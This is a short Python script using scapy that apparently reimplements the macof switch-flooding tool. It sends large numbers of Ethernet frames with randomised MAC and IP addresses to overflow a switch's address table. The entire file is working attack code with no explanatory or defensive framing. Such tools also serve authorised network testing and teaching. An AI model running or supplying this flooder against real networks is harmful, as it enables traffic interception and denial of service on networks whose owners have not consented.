from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC, RandIP


def macof():
    pkt = Ether(dst=RandMAC(), src=RandMAC()) / IP(dst=RandIP(), src=RandIP()) / ICMP()
    sendp(pkt, loop=1, count=10000)


if __name__ == '__main__':
    macof()
